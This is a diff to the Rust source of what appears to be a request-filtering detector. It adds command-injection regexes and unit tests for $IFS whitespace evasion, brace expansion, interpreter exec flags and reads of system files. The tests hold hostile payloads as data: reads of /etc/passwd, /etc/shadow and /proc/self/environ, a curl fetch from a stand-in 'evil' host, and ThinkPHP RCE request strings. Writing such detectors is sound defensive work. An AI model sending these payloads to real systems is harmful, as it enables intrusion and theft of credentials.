@@ -138,6 +138,27 @@ static CMDI_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
         // Wget / curl exfil to attacker hosts when paired with a
         // shell-injection context (semicolon, pipe, backtick, $().
         r"(?i)(?:^|;|\|\|?|&&|`|\$\()\s*(?:wget|curl)\s+[a-z]+://",
+        // CR-1 (2026-07-06 S-Tester) — $IFS / ${IFS} / $IFS$9 whitespace-
+        // evasion. `cat$IFS/etc/passwd` was the cmd_injection_body miss.
+        // $IFS is a bash-only token absent from valid input — unlike the
+        // ad-tech `${UUID}`/`${AUCTION_PRICE}` macros that forced removal of
+        // the generic `${VAR}` pattern, so this is safe to add standalone.
+        r"(?i)\$\{?IFS\}?",
+        // CR-1 companion — read-command + system path reached via a shell
+        // separator (space, tab, `<` redirect). Generalises the literal
+        // `cat /etc/passwd` to /etc//proc//root//var/log/ and more read
+        // commands. The separator class excludes `/`, so a legit
+        // `…/cat/etc/…` PATH segment (no shell separator) is NOT a match.
+        r"(?i)\b(?:cat|less|more|head|tail|nl|od|xxd|base64)\b[^a-z0-9/]{1,4}/(?:etc|proc|root|var/log)/",
+        // CR-2 (2026-07-06) — brace-expansion command list `{cat,/etc/passwd}`.
+        // Bare `id` is excluded from the alternation (it collides with
+        // `{id,name}`-shaped template/format lists); the exec-oriented
+        // commands here don't.
+        r"(?i)\{(?:whoami|cat|ls|nc|ncat|curl|wget|chmod|bash|sh|nslookup|ping)\b,[^}]*\}",
+        // CR-3 (2026-07-06) — scripting-interpreter execution flags. The flag
+        // (`-c`/`-e`/`-r`/`-ne`) disambiguates execution from a filename
+        // (`index.php`) or param (`?python=3`).
+        r"(?i)\b(?:python[0-9.]*|perl|ruby|node|php)\s+-(?:c|e|r|ne|rne)\b",
     ] {
         pats.push(p.to_string());
     }
@@ -387,6 +408,59 @@ mod tests {
         "/index.php?s=/index/think/app/invokefunction&function=call_user_func_array&vars0=system");
     positive!(thinkphp_rce_encoded_backslash,
         "/public/index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array");
+
+    // ============================================================
+    // CR-1..3 (2026-07-06 S-Tester) — command-injection recall lift.
+    // Measured baseline: 12/28 evasion corpus = 43% at 0% FP. These
+    // add FP-safe evasion signatures without relaxing the metachar rule.
+    // ============================================================
+
+    // CR-1 — $IFS / ${IFS} whitespace-evasion. `cat$IFS/etc/passwd` was the
+    // cmd_injection_body miss. $IFS/${IFS}/$IFS$9 are bash-only tokens that
+    // do not occur in valid input (unlike the ad-tech ${UUID} macros that
+    // forced removal of the generic ${VAR} pattern).
+    positive!(cmdi_ifs_bare,             "/api?x=cat$IFS/etc/passwd");
+    positive!(cmdi_ifs_brace,            "/api?x=cat${IFS}/etc/passwd");
+    positive!(cmdi_ifs_9,                "/api?x=cat$IFS$9/etc/passwd");
+    positive!(cmdi_ifs_ls,               "/api?x=ls$IFS-la");
+
+    #[test]
+    fn cmdi_body_ifs_report_payload_fires() {
+        // The exact cmd_injection_body miss: {"format":"cat$IFS/etc/passwd"}
+        // at POST /api/bet-reports/export.
+        let d = CommandInjectionDetector;
+        let (m, u, h, b) = body_view(Some("application/json"), r#"{"format":"cat$IFS/etc/passwd"}"#);
+        let req = make_view(&m, &u, &h, &b);
+        assert!(!d.inspect(&req).is_empty(), "report cmd_injection_body payload must fire");
+    }
+
+    // CR-1 companion — read-command + system path via a shell separator
+    // (space / tab / `<` redirect), covering non-passwd targets the literal
+    // `cat /etc/passwd` pattern missed. Separator excludes `/` so a
+    // `cat/etc/...` PATH segment is NOT a false positive.
+    positive!(cmdi_cat_shadow_space,     "/api?x=cat%20/etc/shadow");
+    positive!(cmdi_cat_redirect,         "/api?x=cat%3C/etc/passwd"); // `<` redirect
+    positive!(cmdi_head_proc,            "/api?x=head%20/proc/self/environ");
+    positive!(cmdi_tail_varlog,          "/api?x=tail%20/var/log/auth.log");
+
+    // CR-2 — brace-expansion command list.
+    positive!(cmdi_brace_expansion,      "/api?x={cat,/etc/passwd}");
+    positive!(cmdi_brace_curl,           "/api?x={curl,http://evil/x}");
+
+    // CR-3 — scripting-interpreter execution flags. The flag disambiguates
+    // execution from a filename/param.
+    positive!(cmdi_python_c,             "/api?x=python%20-c%20'import%20os'");
+    positive!(cmdi_perl_e,               "/api?x=perl%20-e%20'system(1)'");
+    positive!(cmdi_php_r,                "/api?x=php%20-r%20'system(1);'");
+    positive!(cmdi_ruby_e,               "/api?x=ruby%20-e%20puts");
+    positive!(cmdi_node_e,               "/api?x=node%20-e%20process");
+
+    // CR FP guards — must NOT fire.
+    negative!(clean_cat_path_segment,    "/api/cat/etc/list");   // path, not `cat<sep>/etc`
+    negative!(clean_category_brace,      "/list?x={name,value}"); // brace list, no command
+    negative!(clean_python_version,      "/api?python=3.11");     // no exec flag
+    negative!(clean_php_page,            "/shop/index.php?p=1");  // php without exec flag
+    negative!(clean_node_path,           "/node_modules/react");  // node without ` -e`
 
     // --- Negatives: common FP traps ---
     // A normal ThinkPHP route (no invokefunction RCE) must NOT fire.
